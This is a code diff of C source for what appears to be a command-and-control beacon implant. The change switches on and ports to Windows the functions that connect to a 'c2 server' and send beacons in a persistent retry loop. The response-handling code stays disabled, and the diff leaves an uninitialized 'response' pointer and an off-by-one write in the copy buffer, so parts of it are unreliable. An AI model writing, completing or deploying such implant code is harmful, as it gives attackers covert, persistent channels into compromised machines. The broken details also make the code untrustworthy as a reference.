@@ -70,6 +70,7 @@
 
 #define ABORT (-1)
 #define RETRY 0
+#define OK 1
 
 #define STD_TIMEOUT_SEC 30
 
@@ -378,10 +379,35 @@ char *get_beacon(void)
 /**********************************************************/
 /*                    Sending the beacon                  */
 /**********************************************************/
-#if 0
-int connect_to_c2(const char *host, int port)
+
+#ifdef WIN32
+static int inet_pton(int af, const char *src, void *dst)
 {
-	int sockfd;
+	struct sockaddr_storage ss;
+	int iSize = sizeof(ss);
+	CHAR srCopy[INET6_ADDRSTRLEN];
+
+	ZeroMemory(&ss, sizeof(ss));
+	strncpy (srCopy, src, INET6_ADDRSTRLEN);
+	srCopy[INET6_ADDRSTRLEN] = 0;
+
+	if (WSAStringToAddress(srCopy, af, NULL, (struct sockaddr *)&ss, &iSize) == 0) {
+		switch(af) {
+		case AF_INET:
+			*(struct in_addr *)dst = ((struct sockaddr_in *)&ss)->sin_addr;
+			return 1;
+		case AF_INET6:
+			*(struct in6_addr *)dst = ((struct sockaddr_in6 *)&ss)->sin6_addr;
+			return 1;
+		}
+	}
+	return 0;
+}
+#endif
+
+int connect_to_c2(SOCKET_T *sockfd, const char *host, int port)
+{
+	// *sockfd = INVALID_SOCKET
 
 	/* Set host address and port */
 	printf("[*] Setting c2 address and port...");
@@ -396,7 +422,12 @@ int connect_to_c2(const char *host, int port)
 	printf("done\n");
 
 	printf("[*] Creating socket...");
-	if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
+	SOCKET_T sock = socket(AF_INET, SOCK_STREAM, 0);
+#ifdef WIN32
+	if (sock == INVALID_SOCKET) {
+#else
+	if (sock < 0) {
+#endif
 		printf("failed\n");
 		return ABORT;
 	}
@@ -407,48 +438,53 @@ int connect_to_c2(const char *host, int port)
 	tv.tv_sec = timeout;
 	tv.tv_usec = 0;
 	printf("[*] Setting timeout %d seconds...", tv.tv_sec);
-	if (setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, (const char *)&tv,
+#ifdef WIN32
+	if (setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char *)&tv,
+		       sizeof(struct timeval)) == SOCKET_ERROR) {
+#else
+	if (setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char *)&tv,
 		       sizeof(struct timeval)) == -1) {
+#endif
 		printf("failed\n");
 		return ABORT;
 	}
 	printf("done\n");
 
-	printf("[*] Connecting to c2 server...");
-	if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) <
+#ifdef WIN32
+	if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr))
+	    == SOCKET_ERROR) {
+#else
+	if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) <
 	    0) {
-		printf(RED("failed\n"));
-		return RETRY_LATER;
+#endif
+		return RETRY;
 	}
-	printf("done\n");
 
-	return sockfd;
+	*sockfd = sock;
+	return OK;
 }
 
-int send_beacon(int sockfd, char *request, size_t request_len)
+int send_beacon(SOCKET_T sockfd, char *request, size_t request_len)
 {
 	if (request == NULL || request_len == 0)
 		return ABORT;	/* If no beacon could be retrieved, abort */
-
-	printf("[*] Sending HTTP request to server:\n%s\n", request);
 
 	int numsent;
 	char *pos = request;
 	while (request_len > 0) {
 		numsent = send(sockfd, pos, request_len, 0);
-		if (numsent >= 0) {
+#ifdef WIN32
+		if (numsent == SOCKET_ERROR) {
+#else
+		if (numsent < 0) {
+#endif
+			return RETRY;
+		} else {
 			request_len -= numsent;
 			if (request_len)
 				pos += numsent;
-		} else {
-			printf("[*] Error: %s\n", strerror(errno));
-			printf("[*] Could not send beacon, will retry\n");
-			printf("[*] Closing socket\n");
-			return RETRY_LATER;
 		}
 	}
-
-	printf("[*] Beacon sent\n");
 
 	return OK;
 }
@@ -456,7 +492,7 @@ int send_beacon(int sockfd, char *request, size_t request_len)
 /**********************************************************/
 /*                   Receiving the beacon                 */
 /**********************************************************/
-
+#if 0
 char *get_beacon_resp(int sockfd)
 {
 	char *buf = calloc(BEACON_RESP_MAX_SIZE, sizeof(char));
@@ -899,23 +935,21 @@ int main(int argc, char *argv[])
 	while (1) {
 		SOCKET_T sockfd;
 		int ret;
-		printf("[*] Connecting to c2 server...");
-		//ret = connect_to_c2(&sockfd, RHOST, RPORT);
+		printf("[*] Connecting to c2 server...\n");
+		ret = connect_to_c2(&sockfd, RHOST, RPORT);
 		if (ret == ABORT) {
 			/* We don't have a working socket */
-			printf("failed\n");
 			printf("[*] Terminating\n");
 			break;
 		} else if (ret == RETRY) {
 			/* We don't have a working socket */
-			printf("failed\n");
 			printf("[*] Retrying soon...\n");
 			SLEEP(timeout);
 			continue;
 		}
 		/* We have a working socket */
 		printf("[*] Sending beacon to server:\n%s\n", http_req);
-		//ret = send_beacon(sockfd, http_req, strlen(http_req));
+		ret = send_beacon(sockfd, http_req, strlen(http_req));
 		if (ret == ABORT) {
 			printf("[-] Error. Terminating.\n");
 			CLOSE(sockfd);
@@ -927,6 +961,7 @@ int main(int argc, char *argv[])
 			printf("[*] Sleep before retrying...\n");
 			SLEEP(timeout);
 		} else {
+			printf("[*] Beacon sent.\n");
 			char *response;
 			//char *response = get_beacon_resp(sockfd);
 			if (response) {
@@ -936,6 +971,8 @@ int main(int argc, char *argv[])
 				free(response);
 				printf(BLUE("[*] Resuming main loop\n"));
 				SLEEP(timeout);
+			} else {
+				printf("[-] No response received\n");
 			}
 		}
 	}
